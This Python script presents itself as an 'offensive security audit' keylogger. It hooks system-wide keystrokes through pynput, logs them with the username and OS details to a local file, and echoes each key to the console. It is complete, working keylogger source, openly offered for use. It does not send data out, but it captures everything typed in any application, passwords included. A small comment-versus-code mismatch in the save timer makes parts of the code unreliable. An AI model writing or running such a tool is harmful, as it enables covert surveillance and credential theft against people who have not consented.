#!/usr/bin/env python3
"""
Offensive Security Audit Keylogger - The Cyber Avengers Team

This script is engineered for authorized security assessment, utilizing 
system-wide automated keystroke capture with real-time console feedback 
and full team attribution.
"""
import datetime
import os
import sys
import threading
import time
import signal
import re # Retaining standard library imports from original

# --- External Library ---
try:
    from pynput import keyboard
except ImportError:
    print("Error: 'pynput' library not found. Please install it with: pip install pynput")
    sys.exit(1)

# ANSI Color Codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# --- Configuration ---
LOG_FILE = "keystrokes_audit.log"
LOG_INTERVAL_SECONDS = 30  # Save data more frequently for live audit demo
MAX_IDLE_SECONDS = 120     # Shorter idle time for quicker demonstration exit
# ---------------------

# Global variables for state management and communication
log_buffer = []
last_keystroke_time = time.time()
stop_logging = threading.Event()
start_time = datetime.datetime.now()
listener = None

# --- Attribution and Info Functions (Retained and Updated) ---

def print_banner():
    """Display professional banner"""
    # Retained original ASCII Art
    print(f"""
{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗        ║
║     ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝        ║
║     █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗       ║
║     ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║       ║
║     ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝       ║
║     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝        ║
║                                                               ║
║              {Colors.RED}★ HIGH-INTERACTION AUDIT TOOL ★{Colors.CYAN}                 ║
║                                                               ║
║           {Colors.MAGENTA}━━━━  THE CYBER AVENGERS  ━━━━{Colors.CYAN}                      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def print_team_credits():
    """Display team member credits"""
    print(f"{Colors.MAGENTA}┌─────────────────────────────────────────────────────────────┐")
    print(f"│  {Colors.BOLD}Offensive Team Members{Colors.RESET}{Colors.MAGENTA}                                     │")
    print(f"├─────────────────────────────────────────────────────────────┤")
    print(f"│  {Colors.CYAN}•Ajay Pratap Singh{Colors.MAGENTA}                                             │")
    print(f"│  {Colors.CYAN}•Kaushal Kumar{Colors.MAGENTA}                                                │")
    print(f"└─────────────────────────────────────────────────────────────┘{Colors.RESET}\n")

def print_system_info():
    """Display system and monitoring information"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        location = os.path.abspath(LOG_FILE)
        system_info = f"{os.uname().sysname} {os.uname().release}"
        username = os.getenv('USER', 'unknown_user')
    except (AttributeError, OSError):
        location = os.path.abspath(LOG_FILE)
        system_info = "OS Information Unavailable"
        username = os.getenv('USERNAME', 'unknown_user')
    
    print(f"{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║  {Colors.WHITE}{Colors.BOLD}SESSION INFORMATION / LIVE MONITOR{Colors.RESET}{Colors.YELLOW}                         ║")
    print(f"╠═══════════════════════════════════════════════════════════════╣")
    print(f"║  {Colors.GREEN}[✓] Mode:          {Colors.WHITE}Audit w/ Real-time Feedback{Colors.YELLOW}               ║")
    print(f"║  {Colors.GREEN}[✓] Started:       {Colors.WHITE}{timestamp}{Colors.YELLOW}                       ║")
    print(f"║  {Colors.GREEN}[✓] System User:   {Colors.WHITE}{username:<17}{Colors.YELLOW}{Colors.GREEN}[✓] Log File:  {Colors.WHITE}{LOG_FILE}{Colors.YELLOW}    ║")
    print(f"║  {Colors.GREEN}[✓] System OS:     {Colors.WHITE}{system_info:<38}{Colors.YELLOW}    ║")
    print(f"║  {Colors.RED}[!] Status:        {Colors.WHITE}MONITORING... (Ctrl+C to Stop){Colors.YELLOW}             ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")

# --- Core Logging Functions ---

def initialize_log():
    """Initialize the log file with session details."""
    try:
        with open(LOG_FILE, "a") as f:
            f.write("\n" + "═" * 70 + "\n")
            f.write("   AUDIT KEYLOGGER SESSION LOG - THE CYBER AVENGERS\n")
            f.write("   Real-time Feedback Mode\n")
            f.write("═" * 70 + "\n")
            f.write(f"Session Started: {datetime.datetime.now()}\n")
            try:
                f.write(f"User: {os.getenv('USER', 'unknown_user')}\n")
                f.write(f"System: {os.uname().sysname} {os.uname().release}\n")
            except (AttributeError, OSError):
                f.write(f"System: OS information restricted or not available.\n")
            f.write(f"Log Interval: {LOG_INTERVAL_SECONDS}s | Max Idle: {MAX_IDLE_SECONDS}s\n")
            f.write("═" * 70 + "\n\n")
    except Exception as e:
        print(f"{Colors.RED}Error initializing log file: {e}{Colors.RESET}")
        sys.exit(1)

def save_log_buffer():
    """Write the contents of the memory buffer to the log file."""
    global log_buffer
    if not log_buffer:
        return

    try:
        start_count = len(log_buffer)
        with open(LOG_FILE, "a") as f:
            f.write("".join(log_buffer))
        log_buffer = [] 
        # Show immediate feedback that the save occurred
        print(f"\n{Colors.MAGENTA}[*] LOG SAVE: {start_count} events saved to disk.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error saving log buffer: {e}{Colors.RESET}")


def run_timer_thread():
    """A separate thread to periodically save keystrokes and check for inactivity."""
    global last_keystroke_time

    while not stop_logging.is_set():
        time.sleep(1) 
        
        # 1. Periodic Save Check
        if int(time.time()) % LOG_INTERVAL_SECONDS == 0:
            if time.time() - last_keystroke_time > 1: # Only save if we have been typing recently
                save_log_buffer()

        # 2. Inactivity Check
        current_idle_time = time.time() - last_keystroke_time
        if current_idle_time > MAX_IDLE_SECONDS:
            print(f"\n{Colors.RED}[!] Exiting due to inactivity after {MAX_IDLE_SECONDS} seconds.{Colors.RESET}")
            stop_logging.set()
            if listener:
                listener.stop()
            return
            
    save_log_buffer()


def format_key(key):
    """Formats the captured key press for the log file and the console."""
    try:
        # Handle single character keys
        char = key.char
        if char is not None:
            return char, f"{Colors.GREEN}{char}{Colors.RESET}"
    except AttributeError:
        # Handle special keys
        key_name = str(key).split(".")[-1].upper()
        
        if key == keyboard.Key.space:
            return ' ', f"{Colors.GREEN}[SPACE]{Colors.RESET}"
        elif key == keyboard.Key.enter:
            return '\n[ENTER]\n', f"\n{Colors.BLUE}[ENTER]{Colors.RESET}\n"
        elif key == keyboard.Key.tab:
            return '[TAB]', f"{Colors.YELLOW}[TAB]{Colors.RESET}"
        elif key == keyboard.Key.backspace:
            return '[BACKSPACE]', f"{Colors.RED}[BACKSPACE]{Colors.RESET}"
        else:
            # Other special keys like Key.ctrl_l, Key.shift, Key.caps_lock
            return f'[{key_name}]', f"{Colors.CYAN}[{key_name}]{Colors.RESET}"

def on_press(key):
    """Callback function for when a key is pressed."""
    global log_buffer, last_keystroke_time
    
    last_keystroke_time = time.time()
    
    # Get both the clean log string and the colorful console string
    log_string, console_string = format_key(key)
    
    # 1. Add to log buffer (clean version)
    if log_string in ['\n[ENTER]\n', '[BACKSPACE]', '[TAB]']: 
         # Timestamp special keys in the log file for easier analysis
         log_buffer.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {log_string}")
    else:
        log_buffer.append(log_string)

    # 2. Display real-time feedback to the console (colorful version)
    print(console_string, end='', flush=True)


def run_keylogger():
    """Sets up and runs the pynput listener."""
    global listener

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    
    timer_thread = threading.Thread(target=run_timer_thread)
    timer_thread.daemon = True
    timer_thread.start()
    
    try:
        listener.join()
    except Exception:
        pass
    finally:
        stop_logging.set()
        timer_thread.join()

def finalize_session():
    """Finalize session, write summary to log, and print final summary."""
    end_time = datetime.datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    # Ensure final data in buffer is saved
    save_log_buffer() 
    
    try:
        # Re-get size after the final save
        file_size = os.path.getsize(LOG_FILE) 
    except FileNotFoundError:
        file_size = 0

    with open(LOG_FILE, "a") as f:
        f.write("\n" + "═" * 70 + "\n")
        f.write(f"Session Ended: {end_time}\n")
        f.write(f"Duration: {duration:.2f} seconds\n")
        f.write("═" * 70 + "\n")

    print(f"\n{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║  {Colors.BOLD}SESSION SUMMARY{Colors.RESET}{Colors.YELLOW}                                            ║")
    print(f"╠═══════════════════════════════════════════════════════════════╣")
    print(f"║  {Colors.GREEN}[+] Status:        {Colors.WHITE}Session ended successfully{Colors.YELLOW}               ║")
    print(f"║  {Colors.GREEN}[+] Duration:      {Colors.WHITE}{duration:.2f} seconds{Colors.YELLOW}                          ║")
    print(f"║  {Colors.GREEN}[+] File Size:     {Colors.WHITE}{file_size} bytes{Colors.YELLOW}                            ║")
    print(f"║  {Colors.GREEN}[+] Log Location:  {Colors.WHITE}{os.path.abspath(LOG_FILE)[:38]:<38}{Colors.YELLOW}    ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.MAGENTA}{Colors.BOLD}        ★ The Cyber Avengers - Digital Security ★{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Audit Keylogger terminated{Colors.RESET}\n")


def main():
    """Main function to control the lifecycle of the keylogger."""
    global start_time
    # Capture the start time immediately
    start_time = datetime.datetime.now()
    
    try:
        print_banner()
        print_team_credits()
        print_system_info()
        
        initialize_log()
        
        # Start the key capture service
        run_keylogger() 
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Manual Interruption (Ctrl+C) received.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Runtime Error: {e}{Colors.RESET}")
        
    finally:
        finalize_session()
        sys.exit(0)

if __name__ == "__main__":
    main()
